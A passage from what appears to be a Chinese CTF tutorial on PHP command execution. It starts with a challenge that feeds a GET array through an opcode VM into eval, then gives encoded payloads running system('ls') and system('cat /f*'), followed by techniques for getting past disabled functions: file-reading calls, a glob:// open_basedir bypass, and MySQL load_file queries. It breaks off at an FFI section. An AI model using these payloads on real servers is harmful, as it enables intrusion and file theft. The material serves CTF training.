class="hljs-number">92</span>, <span class="hljs-number">9</span>, <span class="hljs-number">454</span>, <span class="hljs-number">220</span>, <span class="hljs-number">93</span>, <span class="hljs-number">829</span>, <span class="hljs-number">221</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">29</span>, <span class="hljs-number">158</span>, <span class="hljs-number">381</span>, <span class="hljs-number">222</span>, <span class="hljs-number">14</span>, <span class="hljs-number">710</span>, <span class="hljs-number">158</span>, <span class="hljs-number">95</span>, <span class="hljs-number">509</span>, <span class="hljs-number">159</span>, <span class="hljs-number">5</span>, <span class="hljs-number">454</span>, <span class="hljs-number">223</span>, <span class="hljs-number">224</span>, <span class="hljs-number">381</span>, <span class="hljs-number">224</span>, <span class="hljs-number">11</span>, <span class="hljs-number">710</span>, <span class="hljs-number">224</span>, <span class="hljs-number">33</span>, <span class="hljs-number">1021</span>, <span class="hljs-number">225</span>, <span class="hljs-number">7</span>, <span class="hljs-number">198</span>, <span class="hljs-number">161</span>, <span class="hljs-number">98</span>, <span class="hljs-number">573</span>, <span class="hljs-number">162</span>, <span class="hljs-number">13</span>, <span class="hljs-number">966</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">509</span>, <span class="hljs-number">99</span>, <span class="hljs-number">7</span>, <span class="hljs-number">454</span>, <span class="hljs-number">163</span>, <span class="hljs-number">228</span>, <span class="hljs-number">509</span>, <span class="hljs-number">228</span>, <span class="hljs-number">13</span>, <span class="hljs-number">710</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">573</span>, <span class="hljs-number">293</span>, <span class="hljs-number">11</span>, <span class="hljs-number">966</span>, <span class="hljs-number">165</span>, <span class="hljs-number">230</span>, <span class="hljs-number">381</span>, <span class="hljs-number">230</span>, <span class="hljs-number">5</span>, <span class="hljs-number">710</span>, <span class="hljs-number">166</span>, <span class="hljs-number">167</span>, <span class="hljs-number">957</span>, <span class="hljs-number">167</span>, <span class="hljs-number">14</span>, <span class="hljs-number">454</span>, <span class="hljs-number">39</span>, <span class="hljs-number">104</span>, <span class="hljs-number">317</span>, <span class="hljs-number">104</span>, <span class="hljs-number">6</span>, <span class="hljs-number">198</span>, <span class="hljs-number">40</span>, <span class="hljs-number">233</span>, <span class="hljs-number">637</span>, <span class="hljs-number">233</span>, <span class="hljs-number">10</span>, <span class="hljs-number">966</span>, <span class="hljs-number">233</span>, <span class="hljs-number">64</span>, <span class="hljs-number">999</span>, <span class="hljs-number">56</span>, <span class="hljs-number">78</span> );<br><span class="hljs-variable">$idx</span> = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">JudgeControl</span>(<span class="hljs-params"><span class="hljs-variable">$op</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$idx</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$op</span>-&gt;opcode == <span class="hljs-number">999</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$idx</span> == <span class="hljs-number">6</span> &amp;&amp; <span class="hljs-variable">$op</span>-&gt;flag == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-variable">$op</span>-&gt;rbx = <span class="hljs-number">3</span>;<br>        <span class="hljs-variable">$idx</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$idx</span> == <span class="hljs-number">6</span> &amp;&amp; <span class="hljs-variable">$op</span>-&gt;flag != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-variable">$idx</span> = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idx</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(((<span class="hljs-variable">$op</span>-&gt;opcode &gt;&gt; <span class="hljs-variable">$idx</span>) &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>            <span class="hljs-variable">$idx</span> ++;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idx</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$PC</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">info</span>();<br><span class="hljs-variable">$code</span>-&gt;opcode = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span>];<br><span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">1</span>];<br><span class="hljs-variable">$code</span>-&gt;rbx = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">2</span>];<br><span class="hljs-variable">$code</span>-&gt;tmp = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">1</span>];<br><span class="hljs-variable">$code</span>-&gt;flag = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$cmd</span>) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$cmd</span>) !== <span class="hljs-number">42</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are not bond 007&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">TRUE</span>)<br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span> == <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">JudgeControl</span>(<span class="hljs-variable">$code</span>, <span class="hljs-variable">$idx</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;idx:&quot;</span>.<span class="hljs-variable">$idx</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;opcode: &quot;</span>.<span class="hljs-variable">$code</span>-&gt;opcode.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;p: &quot;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span> == <span class="hljs-number">8</span>) <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$p</span>)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$input</span>[<span class="hljs-variable">$code</span>-&gt;rax % <span class="hljs-number">64</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$input</span>[<span class="hljs-variable">$code</span>-&gt;rax % <span class="hljs-number">64</span>];<br>            <span class="hljs-variable">$code</span>-&gt;rbx = <span class="hljs-variable">$input</span>[<span class="hljs-variable">$code</span>-&gt;rbx % <span class="hljs-number">64</span>];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$stack</span> = <span class="hljs-variable">$code</span>-&gt;rax ^ <span class="hljs-variable">$code</span>-&gt;rbx;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rbx = <span class="hljs-variable">$code</span>-&gt;rax &amp; <span class="hljs-variable">$code</span>-&gt;rbx;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rbx = <span class="hljs-variable">$code</span>-&gt;rbx &lt;&lt; <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$code</span>-&gt;flag = <span class="hljs-variable">$code</span>-&gt;rbx;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$stack</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$stack</span>;<br>            <span class="hljs-variable">$input</span>[<span class="hljs-variable">$code</span>-&gt;tmp % <span class="hljs-number">64</span>] = <span class="hljs-variable">$code</span>-&gt;rax % <span class="hljs-number">256</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            <span class="hljs-variable">$PC</span> += <span class="hljs-number">3</span>;<br>            <span class="hljs-variable">$code</span>-&gt;opcode = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span>];<br>            <span class="hljs-variable">$code</span>-&gt;rax = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$code</span>-&gt;rbx = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">2</span>];<br>            <span class="hljs-variable">$code</span>-&gt;tmp = <span class="hljs-variable">$opcode</span>[<span class="hljs-variable">$PC</span> + <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$code</span>-&gt;flag = <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$idx</span> = -<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span> :<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-variable">$idx</span> ++;<br>&#125;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$s</span>) &#123;<br>        <span class="hljs-variable">$cmd</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$s</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br><br>考点：ASCII构造<br><br>解题思路：<br>    依据注释访问bond007.php，传参<span class="hljs-string">&#x27;cmd&#x27;</span>；<br><br>payload:<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>    -&gt;?cmd[<span class="hljs-number">52</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">53</span>]=<span class="hljs-number">121</span>&amp;cmd[<span class="hljs-number">54</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">55</span>]=<span class="hljs-number">116</span>&amp;cmd[<span class="hljs-number">56</span>]=<span class="hljs-number">101</span>&amp;cmd[<span class="hljs-number">57</span>]=<span class="hljs-number">109</span>&amp;cmd[<span class="hljs-number">58</span>]=<span class="hljs-number">40</span>&amp;cmd[<span class="hljs-number">59</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">60</span>]=<span class="hljs-number">108</span>&amp;cmd[<span class="hljs-number">61</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">62</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">63</span>]=<span class="hljs-number">41</span>&amp;cmd[<span class="hljs-number">64</span>]=<span class="hljs-number">59</span>&amp;cmd[<span class="hljs-number">65</span>]=<span class="hljs-number">47</span>&amp;cmd[<span class="hljs-number">66</span>]=<span class="hljs-number">42</span>&amp;cmd[<span class="hljs-number">15</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">16</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">17</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">18</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">19</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">20</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">21</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">22</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">23</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">24</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">25</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">26</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">27</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">28</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">29</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">30</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">31</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">32</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">33</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">34</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">35</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">36</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">37</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">38</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">39</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">40</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">41</span>]=<span class="hljs-number">100</span><br><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>)<br>    -&gt;?cmd[<span class="hljs-number">52</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">53</span>]=<span class="hljs-number">121</span>&amp;cmd[<span class="hljs-number">54</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">55</span>]=<span class="hljs-number">116</span>&amp;cmd[<span class="hljs-number">56</span>]=<span class="hljs-number">101</span>&amp;cmd[<span class="hljs-number">57</span>]=<span class="hljs-number">109</span>&amp;cmd[<span class="hljs-number">58</span>]=<span class="hljs-number">40</span>&amp;cmd[<span class="hljs-number">59</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">60</span>]=<span class="hljs-number">108</span>&amp;cmd[<span class="hljs-number">61</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">62</span>]=<span class="hljs-number">32</span>&amp;cmd[<span class="hljs-number">63</span>]=<span class="hljs-number">47</span>&amp;cmd[<span class="hljs-number">64</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">65</span>]=<span class="hljs-number">41</span>&amp;cmd[<span class="hljs-number">66</span>]=<span class="hljs-number">59</span>&amp;cmd[<span class="hljs-number">67</span>]=<span class="hljs-number">47</span>&amp;cmd[<span class="hljs-number">68</span>]=<span class="hljs-number">42</span>&amp;cmd[<span class="hljs-number">17</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">18</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">19</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">20</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">21</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">22</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">23</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">24</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">25</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">26</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">27</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">28</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">29</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">30</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">31</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">32</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">33</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">34</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">35</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">36</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">37</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">38</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">39</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">40</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">41</span>]=<span class="hljs-number">100</span><br><br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>)<br>    -&gt;?cmd[<span class="hljs-number">52</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">53</span>]=<span class="hljs-number">121</span>&amp;cmd[<span class="hljs-number">54</span>]=<span class="hljs-number">115</span>&amp;cmd[<span class="hljs-number">55</span>]=<span class="hljs-number">116</span>&amp;cmd[<span class="hljs-number">56</span>]=<span class="hljs-number">101</span>&amp;cmd[<span class="hljs-number">57</span>]=<span class="hljs-number">109</span>&amp;cmd[<span class="hljs-number">58</span>]=<span class="hljs-number">40</span>&amp;cmd[<span class="hljs-number">59</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">60</span>]=<span class="hljs-number">99</span>&amp;cmd[<span class="hljs-number">61</span>]=<span class="hljs-number">97</span>&amp;cmd[<span class="hljs-number">62</span>]=<span class="hljs-number">116</span>&amp;cmd[<span class="hljs-number">63</span>]=<span class="hljs-number">32</span>&amp;cmd[<span class="hljs-number">64</span>]=<span class="hljs-number">47</span>&amp;cmd[<span class="hljs-number">65</span>]=<span class="hljs-number">102</span>&amp;cmd[<span class="hljs-number">66</span>]=<span class="hljs-number">42</span>&amp;cmd[<span class="hljs-number">67</span>]=<span class="hljs-number">39</span>&amp;cmd[<span class="hljs-number">68</span>]=<span class="hljs-number">41</span>&amp;cmd[<span class="hljs-number">69</span>]=<span class="hljs-number">59</span>&amp;cmd[<span class="hljs-number">70</span>]=<span class="hljs-number">47</span>&amp;cmd[<span class="hljs-number">71</span>]=<span class="hljs-number">42</span>&amp;cmd[<span class="hljs-number">20</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">21</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">22</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">23</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">24</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">25</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">26</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">27</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">28</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">29</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">30</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">31</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">32</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">33</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">34</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">35</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">36</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">37</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">38</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">39</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">40</span>]=<span class="hljs-number">100</span>&amp;cmd[<span class="hljs-number">41</span>]=<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>

<h1 id="突破禁用函数"><a href="#突破禁用函数" class="headerlink" title="突破禁用函数"></a>突破禁用函数</h1><p><strong>命令执行，突破禁用函数；攻击者需要想方设法绕过重重限制</strong></p>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>一般POST突破，直接在POST里面调用函数并传入即可；</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">查找路径：<br>file=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br>file=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br>file=<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;../../../*&#x27;</span>));<br><br>读取目标文件：<br>file=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>file=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>file=<span class="hljs-title function_ invoke__">readgzfile</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>file=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>file=<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>file=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="拦截跳出"><a href="#拦截跳出" class="headerlink" title="拦截跳出"></a>拦截跳出</h2><p>如果不想执行后续代码，避免输出缓冲区被劫持过滤，可以在命令末尾处添加以下两种功能函数：</p>
<ol>
<li>提前送出缓冲区；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ob_flush</span>();<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br></code></pre></td></tr></table></figure></li>
<li>提前终止程序；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="glob伪协议"><a href="#glob伪协议" class="headerlink" title="glob伪协议"></a>glob伪协议</h2><p>如果存在open_basedir配置的限制，常规的PHP访问函数被限制或禁用，<br>使用glob协议绕过open_basedir的限制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">file=<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><p>如果存在include_path限制，文件包含路径受限，无法直接使用include()包含文件得到flag信息，<br>使用以下方式连接MySQL数据库访问flag：</p>
<ol>
<li>PDO连接；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">file=<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql: host = localhost; dbname = ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li>
<li>回环地址连接；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">file=<br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;ctftraining&quot;</span>);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select load_file(&#x27;/flag.txt&#x27;) as a&quot;</span>;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$row</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li>
</ol>
<h2 id="FFI（仅限于PHP7-4及以上版本）"><a href="#FFI（仅限于PHP7-4及以上版本）" class="headerlink" title="FFI（仅限于PHP7.4及以上版本）"></a>FFI（仅限于PHP7.4及以上版本）</h2><p>PHP外部函数接口特性，用于实现高级语言之间的互相调用；<br>使用FFI::cdef()函数定义我们需要调用的函数的原型：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">FFI::<span class="hljs-title function_ invoke__">cdef</span>([<span class="hljs-keyword">string</span> <span class="hljs-variable">$cdef</span> = <span class="hljs-string">&quot;&quot;</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$lib</span> = <span class="hljs-literal">null</span>]]): FFI<br></code></pre></td></tr></table></figure>
<p>这里引入例题web77（本题未开源，故不放上源代码，仅展示payload）：</p>
